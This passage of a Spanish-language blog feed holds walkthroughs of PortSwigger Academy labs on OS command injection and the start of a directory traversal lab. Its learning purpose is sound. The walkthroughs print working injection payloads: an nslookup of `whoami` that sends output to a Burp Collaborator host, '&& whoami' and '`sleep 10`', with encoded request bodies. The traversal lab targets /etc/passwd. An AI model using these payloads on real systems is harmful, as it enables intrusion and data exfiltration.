&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: OS Command Injection Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/</link>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: OS Command Injection Lab 5" /&gt;&lt;h1 id=&#34;lab-blind-os-command-injection-with-out-of-band-data-exfiltration&#34;&gt;Lab: Blind OS command injection with out-of-band data exfiltration&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es obtener ejecucion de comandos en el sitio web, pero ya que no se recibe respuesta hay que realizar una consulta hacia el dns o una web para saber que se ejecuto la secuencia correctamente.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web cuenta con un formulario para el envio de feedback hacia el correo del servidor.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 119; 
			flex-basis: 286px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/web.png&#34; data-size=&#34;1193x1000&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/web.png&#34;
			width=&#34;1193&#34;
			height=&#34;1000&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/web_hub723137999b8577144085ec4be2a679e_50121_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/web_hub723137999b8577144085ec4be2a679e_50121_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero hace una peticion que lo que hace es enviar el correo por medio de una consulta por terminal de &lt;code&gt;mail&lt;/code&gt; que es para el envio de correo por terminal linux.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 664px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request.png&#34; data-size=&#34;1532x553&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request.png&#34;
			width=&#34;1532&#34;
			height=&#34;553&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request_hud95893744cd9c514047af26e7b3de18d_75046_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request_hud95893744cd9c514047af26e7b3de18d_75046_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;El tipo de ejecucion que se hace al backend es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que haremos es inyectar otros parametros para poder ejecutar otros comandos, y queremos ejecutar la siguiente consulta para que nos devuelva el nombre del usuario que esta ejecutando el script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; nslookup &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;whoami&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.n5trm2vov2yg13fnkvptzh6dd4jvdj2.burpcollaborator.net &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;   -aFrom:peter@normal-user.net feedback@vulnerable-website.com &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; nslookup url.burpcollaborator.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Por lo que la peticion quedaria asi (codificada en formato URL)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;csrf=19jGeYaNMECUmKvnBJNL0vXbIEuE06Cj&amp;amp;name=name&amp;amp;email=email%40mail.com+||+nslookup+`whoami`.n5trm2vov2yg13fnkvptzh6dd4jvdj2.burpcollaborator.net+||+&amp;amp;subject=subject&amp;amp;message=message+%26+nslookup+co4yszdbwhw8owp25ugijgpwinoec3.burpcollaborator.net
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos una ejecucion de comandos dentro del servidor enviando el request.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 246; 
			flex-basis: 591px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request2.png&#34; data-size=&#34;1211x491&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request2.png&#34;
			width=&#34;1211&#34;
			height=&#34;491&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request2_huad09e5579e9e3d6eb082db5ece5df1a5_72669_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request2_huad09e5579e9e3d6eb082db5ece5df1a5_72669_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y viendo la respuesta de burp collaborator permite ver como se ha hecho la solicitud:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 357; 
			flex-basis: 858px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request3.png&#34; data-size=&#34;1542x431&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request3.png&#34;
			width=&#34;1542&#34;
			height=&#34;431&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request3_hu0a92e15f74dfd50c4b3a5ea12585a57d_61148_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/request3_hu0a92e15f74dfd50c4b3a5ea12585a57d_61148_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Burp Collaborator&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Burp Collaborator&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 665px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/resuelto.png&#34; data-size=&#34;1808x652&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/resuelto.png&#34;
			width=&#34;1808&#34;
			height=&#34;652&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/resuelto_hu17d194f161fee782c4d72599bae9c082_87875_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-5/resuelto_hu17d194f161fee782c4d72599bae9c082_87875_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: OS Command Injection Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/</link>
        <pubDate>Wed, 01 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: OS Command Injection Lab 1" /&gt;&lt;h1 id=&#34;lab-os-command-injection-simple-case&#34;&gt;Lab: OS command injection, simple case&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es obtener ejecucion de comandos en el sitio web, ejecutando &lt;code&gt;whoami&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 125; 
			flex-basis: 301px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/web.png&#34; data-size=&#34;1822x1449&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/web.png&#34;
			width=&#34;1822&#34;
			height=&#34;1449&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/web_huae90fd197c8b66698fea9d61c0120839_546600_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/web_huae90fd197c8b66698fea9d61c0120839_546600_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero hace una peticion que checa el stock que existe para posteriormente dar la respuesta. Aca lo mas seguro es que realice el proceso desde un script y lo ejecute el propio programa pasandole los parametros pero no hace un filtrado de los datos que nosotros ingresemos. Enviamos los parametros de productId y storeId&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 235; 
			flex-basis: 565px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request.png&#34; data-size=&#34;1212x514&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request.png&#34;
			width=&#34;1212&#34;
			height=&#34;514&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request_hu3cb26f665c35846ccdfded8c8b409fb9_65004_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request_hu3cb26f665c35846ccdfded8c8b409fb9_65004_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;El tipo de ejecucion que hace es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stockreport.pl &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que haremos es inyectar otros parametros para poder ejecutar otros comandos, y queremos ejecutar la siguiente consulta para que nos devuelva el nombre del usuario que esta ejecutando el script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;stockreport.pl &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Por lo que la peticion quedaria asi (codificada en formato URL)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;productId=1&amp;amp;storeId=1+%26%26+whoami
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos la ejecucion de comandos en el servidor.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 320; 
			flex-basis: 769px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request2.png&#34; data-size=&#34;1543x481&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request2.png&#34;
			width=&#34;1543&#34;
			height=&#34;481&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request2_hu296ea818228ed63c205dca8c9473472f_70653_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/request2_hu296ea818228ed63c205dca8c9473472f_70653_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 284; 
			flex-basis: 681px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/resuelto.png&#34; data-size=&#34;1776x625&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/resuelto.png&#34;
			width=&#34;1776&#34;
			height=&#34;625&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/resuelto_hu8cf5a91529c19e1218ff62e27481ff83_134189_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-1/resuelto_hu8cf5a91529c19e1218ff62e27481ff83_134189_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/os-command-injection/lab-simple&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: OS Command Injection Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/</link>
        <pubDate>Wed, 01 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/head.png" alt="Featured image of post Portswigger Academy Learning Path: OS Command Injection Lab 2" /&gt;&lt;h1 id=&#34;lab-blind-os-command-injection-with-time-delays&#34;&gt;Lab: Blind OS command injection with time delays&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es obtener ejecucion de comandos en el sitio web, pero ya que no se recibe respuesta hay que ingresar un delay para saber que se ejecuto la inyeccion correctamente.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web cuenta con un formulario para el envio de feedback hacia el correo del servidor.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 119; 
			flex-basis: 286px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/web.png&#34; data-size=&#34;1193x1000&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/web.png&#34;
			width=&#34;1193&#34;
			height=&#34;1000&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/web_hub723137999b8577144085ec4be2a679e_50121_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/web_hub723137999b8577144085ec4be2a679e_50121_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero hace una peticion que lo que hace es enviar el correo por medio de una consulta por terminal de &lt;code&gt;mail&lt;/code&gt; que es para el envio de correo por terminal linux.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 258; 
			flex-basis: 619px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request.png&#34; data-size=&#34;1538x596&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request.png&#34;
			width=&#34;1538&#34;
			height=&#34;596&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request_hu821bfd3ff034978899a4e8287efbf0f4_77736_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request_hu821bfd3ff034978899a4e8287efbf0f4_77736_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;El tipo de ejecucion que se hace al backend es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que haremos es inyectar otros parametros para poder ejecutar otros comandos, y queremos ejecutar la siguiente consulta para que nos devuelva el nombre del usuario que esta ejecutando el script&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;sleep 10&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This site is great&amp;#34;&lt;/span&gt; -aFrom:peter@normal-user.net feedback@vulnerable-website.com &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;sleep 10&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Por lo que la peticion quedaria asi (codificada en formato URL)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;csrf=19jGeYaNMECUmKvnBJNL0vXbIEuE06Cj&amp;amp;name=name&amp;amp;email=email%40mail.com&amp;amp;subject=subject&amp;amp;message=message+`sleep+10`%0D%0A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos una ejecucion de comandos dentro del servidor, porque la respuesta ha tardado 10 segundos en contestar como se puede ver en la &lt;code&gt;esquina inferior derecha&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 195; 
			flex-basis: 469px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request2.png&#34; data-size=&#34;1903x973&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request2.png&#34;
			width=&#34;1903&#34;
			height=&#34;973&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request2_hu7a38f7a9a4a62dcf28e350ab7126e252_107266_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/request2_hu7a38f7a9a4a62dcf28e350ab7126e252_107266_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 210; 
			flex-basis: 505px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/resuelto.png&#34; data-size=&#34;1749x830&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/resuelto.png&#34;
			width=&#34;1749&#34;
			height=&#34;830&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/resuelto_hu117794ec452f7bac49e7825bfa86703d_92785_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-os-command-injection-lab-2/resuelto_hu117794ec452f7bac49e7825bfa86703d_92785_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Directory Traversal Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/</link>
        <pubDate>Sun, 28 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: Directory Traversal Lab 1" /&gt;&lt;h1 id=&#34;lab-file-path-traversal-simple-case&#34;&gt;Lab: File path traversal, simple case&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; todo esto en una vulnerabilidad la cual es la que desplega las imagenes.&lt;/p&gt;
&lt;p&gt;El ataque es el siguiente, en el cual se permite leer otros archivos arbitrarios en el servidor, basandose en un request que pueda hacer una solicitud valida.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/diagrama.svg&#34; &gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-1/diagrama.svg&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Diagrama de vulnerabilidad Directory Traversal&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Diagrama de vulnerabilidad Directory Traversal&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
